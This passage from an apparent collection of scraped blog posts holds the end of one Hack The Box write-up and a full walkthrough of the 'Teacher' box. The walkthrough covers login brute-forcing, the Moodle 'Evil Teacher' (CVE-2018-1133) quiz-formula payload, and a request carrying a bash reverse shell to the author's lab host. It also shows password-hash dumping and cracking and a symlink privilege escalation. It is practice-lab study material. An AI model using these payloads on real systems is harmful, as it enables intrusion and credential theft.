Inappropriate ioctl for devicebash: no job control in this shellroot@horizontall:/home/developer/myproject/public# cat /root/root.txtcat /root/root.txt19c▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓8f4root@horizontall:/home/developer/myproject/public#\nHorizontal Learnings\nThere was certainly a lot to learn from this one. I’m starting to understand the difference between difficult and time-consuming boxes. The time it takes to own a box doesn’t necessarily equate to the difficulty. This box took me a long time to complete but it wasn’t that difficult. Owning this box required exploiting publically known vulnerabilities with available exploits. In my opinion, that is exactly what an easy box should be. It did require a lot of enumeration and knowing what to look for.\nI enjoyed this box a lot, it let me practise techniques I’m familiar with. It introduced me to technologies I hadn’t used before and their vulnerabilities. Furthermore, it also highlighted areas where I need to invest time to improve. Admittedly, I was worried that the different exploits weren’t going to work but I was pleasantly surprised. Overall, this was a great box which I’m probably going to revisit to get a better understanding."
    },
    {
        "title": "Hack The Box Teacher Writeup",
        "link": "https://medium.com/@joemcfarland/hack-the-box-teacher-writeup-31979f830ba1",
        "content": "Teacher is an easy Linux box created by mrh4sh on Hack The Box. The official walkthrough states that it’s a medium box. However, it is categorized as an easy box in the machines section. It is recommended that you have basic Linux and MySQL knowledge to complete this box. By completing this box you will learn Website Enumeration, Password Brute-Forcing, Moodle Quiz Module Exploitation, Database Enumeration, Password Cracking, and Linux Symlink Misconfiguration. Hello world, welcome to Haxez where today I will be explaining how I hacked Teacher.\nTeacher Enumeration\nFirst, I spawned the box and connected my attack box to the Hack The Box VPN. Once connected, I sent a ping request to the box to ensure it was online. Then I performed a Nmap scan to check what ports were open. Furthermore, I requested the service versions, asked for default scripts to be run, and that the minimum packet rate was 10000. Finally, I saved the output in all formats to files called teacher. From the results, I learned that only port 80 for HTTP was open and that it was running Apache 2.4.25.\nsudo nmap -sC -sV -p- 10.129.202.224 --min-rate 10000 -oA teacher\nTeacher Web Application Enumeration\nSince port 80 was the only open port, I headed over to the application. There wasn’t a great deal of functionality offered by the application. It seemed fairly generic with few pages that I could interact with. For an application that calls itself Blackhat Highschool, it seemed a bit too clean. I was hoping for something dark and edgy.\nMoving on, I ran whatweb against the application which told me it was an HTML 5 application with JQuery 1.11.1. Next, I navigated to index pages with various different extensions (index.html, index.php). Sure enough, the one that loaded the main page was index.html.\nAs I didn’t have much to go on, I decided to run gobuster to look for hidden content. Perhaps there was a hidden directory or a secret file telling me that the princess is in another castle. I told gobuster to perform a directory attack using the raft-small-words.txt wordlist in SecLists. Furthermore, I also asked it to try various different extensions and set the thread count to 50.\nAs a result, I learned that there was a directory called Moodle. Their GitHub page explains that Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License. Moodle is used for blended learning, distance education flipped classrooms, and other online learning projects in schools, universities, workplaces, and other sectors. I headed to the Moodle directory but received an error because it redirected to teacher.htb. Therefore, I added the IP address and teacher.htb domain to my /etc/hosts file and revisited the directory. Abracadabra, the site started loading.\nPicture In Picture\nI honestly don’t know what to say about this part of the box. I know I wouldn’t have found it if it wasn’t for a walkthrough. It’s not something I regularly check. I found Moodle but had no way to log in. However, directory listing on the images directory was enabled. Visiting each of the images loaded an image as expected, except for 5.png.\nI downloaded the picture locally and used less to review the contents of the file. It wasn’t an image at all. It appeared to be a helpdesk ticket. I can’t fathom how a helpdesk ticket would have ended up on the website. For my own sanity, I’m going to pretend that the helpdesk agent and web developer are the same person. Furthermore, I’m also going to pretend that they accidentally renamed the wrong file and uploaded it. The ticket gave me the username Giovanni and a partial password of Th4C00lTeacha.\nMoodle Bruteforce\nI launched Burp and headed back to the Moodle login page. Next, I populated the login form with the credentials provided in the support ticket. Then, I clicked submit and located the login request in Burp’s HTTP history. I sent the request to the intruder tool and added a character to the end of the password. Then, I highlighted that character and added the payload characters.\nNext, I navigated to the payload tab but because I’m using Burp community edition, I had to create my own payloads. As a result, I combined several wordlists from the SecLists fuzzing directory so that they contained numbers 0 to 9, all alphabetical characters (lower and uppercase), and all special characters.\nI then click the start attack button and watched as Burp went through each payload, appending it to the end of the password. There are other tools that I could have used to do this such as WFUZZ or FFUF but I know how to use Burp so I thought it was the best option. An indication that a specific payload has had a different result is the length of the response produced by the application. The screenshot below shows that most of the responses were 868 characters. However, the payload with the # symbol produced a response with 993 characters.\nEvil Teacher Vulnerability\nI wasn’t sure what the Moodle version was. I ran what web again against the teacher.htb domain Moodle directory but got nothing. As a result, I looked on Google and found that the Moodle version can be found from the Moodle Docs for this page link at the bottom of a course page. This told me that it was Moodle version 3.4.\nThere is a vulnerability in Moodle 3.4 with the CVE designation CVE-2018–1133. The vulnerability is also known as Evil Teacher. It could allow a user with the teacher role to perform code execution by creating a quiz. SonarSource has an excellent writeup on it so I’m not going to attempt to explain it in too much detail. Essentially, formulas are passed to an eval function which allows for code execution. So if a threat actor can create a quiz with a malicious formula in one of the questions, they may be able to execute code.\nTeacher Foothold\nI navigated to the algebra page and enabled editing. Next, I used the add an activity or resource option to add a quiz to the Topic 1 section.\nI gave the quiz a name and description and clicked next.\nAfter that, I clicked the little blue add link on the next page and chose to add a question. Then, I selected the calculated question type as that would be likely to have the option to add a formula. Finally, I pasted the working exploit into the formula and changed the grad value to 100%.\n/*{a*/`$_GET[0]`;//{x}}\nIt was time for the moment of truth. I captured the request with Burp and sent it to the repeater tool. Next, I appended the URL with a payload that would ping my box. I started tcpdump to listen out for ICMP packets that hit my tun0 adaptor and clicked send.\nGET /moodle/question/question.php?returnurl=%2Fquestion%2Fedit.php%3Fcmid%3D7&appendqnumstring&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=/bin/ping+10.10.14.34 HTTP/1.1\nsudo tcpdump -i tun0 -n icmp\nTo my surprise, it worked the first time. I started receiving ping packets from the target box.\nNow that I had code execution, I modified my payload to a reverse shell, started netcat, and was able to pop a reverse shell.\nGET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D8%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=8&0=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.34/9001+0>%261' HTTP/1.1\nTeacher System Enumeration\nI couldn’t find the user flag once logged in so I checked the home directory and that there was a user called giovanna. That’s probably where the user.txt file is. I could try switching to that user with the password we logged in to Moodle with. However, I decided to take a look at the database first. I pulled the username and password from the /var/www/html/moodle/config.php file. After logging in, I was able to grab usernames and password hashes from the mdl_users table.\nselect id,username,password from mdl_user;\nI copied the Giovannibak hash to a file on my attack box and used John to crack it with the rockyou wordlist.\nI was then able to switch to the giovanni user and capture the user.txt flag.\nwww-data@teacher:/var/www/html/moodle$ su giovannisu giovanniPassword: expelledgiovanni@teacher:/var/www/html/moodle$ cd ~/cd ~/giovanni@teacher:~$ lslsuser.txt  workgiovanni@teacher:~$ cat user.txtcat user.txt881▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓823\nTeacher Privilege Escalation\nThe box keeps crashing meaning I have to do the above process all over again. As a result, the following explanation is going to be brief because I simply can’t be bothered with this box anymore. Looking at the time stamps on the user’s home directory I could see that something was changing fairly frequently. I set up a Python webserver and download pspy onto the box. Running pspy I noticed that a backup script was running.\nThe backup script was changing to the /home/giovanni/work directory and then backing up the courses directory. It was then changing the directory to /home/giovanni/work/tmp and changing the permissions to 777.\ngiovanni@teacher:/var/www/html/moodle/question$ cat /usr/bin/backup.sh#!/bin/bashcd /home/giovanni/work;tar -czvf tmp/backup_courses.tar.gz courses/*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R;\nYou may have to forgive me here as I’ve reached the end of my tether. I had to restart the box about 5 times due to it crashing repeatedly. All I did was create a symbolic link from courses to /root. That way, when the script runs, the contents of the root directory will be backed up to work/tmp/courses which will allow me to capture the root flag.\ngiovanni@teacher:~/work$ ln -s /root coursesgiovanni@teacher:~/work$ ls -laSh coursesgiovanni@teacher:~/work$ lscourses  courses.bak  tmpgiovanni@teacher:~/work$ cd tmpgiovanni@teacher:~/work/tmp$ lsbackup_courses.tar.gz  coursesgiovanni@teacher:~/work/tmp$ cd coursesgiovanni@teacher:~/work/tmp/courses$ lsalgebra  root.txtgiovanni@teacher:~/work/tmp/courses$ cat root.txtcat root.txt63d▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓3cc\nTeacher Learnings\nIronically, I didn’t learn a lot from the teacher box. The Moodle exploit was interesting as I hadn’t done it before but that was about it. Unfortunately, I have to say that this is one of my least favorite boxes that I’ve completed so far. The concept is nice but the box was too flakey, well for me it was anyway. It seemed that the slightest mistake in syntax caused the box to throw a tantrum. This is on a private VIP box too so not like other people were hitting it.\nI think enabling SSH would have made the box more tolerable as it would have allowed quick access to the user. I wouldn’t want this on every box but having to repeat the Moodle exploit every time the box decided to stop responding made me want to quit. Also what was up with the credentials hidden in the image… Oh well, it’s done now and I can put it behind me. Glad I did it but didn’t enjoy it. Thanks for the box!"
    }
]